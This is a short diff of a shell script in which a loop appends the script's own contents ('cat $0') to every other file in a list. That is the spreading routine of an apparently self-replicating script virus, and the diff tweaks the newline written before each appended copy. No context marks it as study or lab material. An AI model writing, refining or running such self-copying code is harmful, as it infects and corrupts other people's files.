@@ -18,7 +18,7 @@ filename=$(basename $0)
 
 for file in "${files[@]}"; do
     if [[ $file != $filename ]]; then
-        echo -e "\n" >> "$file"
+        echo -n -e "\n" >> "$file"
         cat $0 >> "$file"
     fi
 done
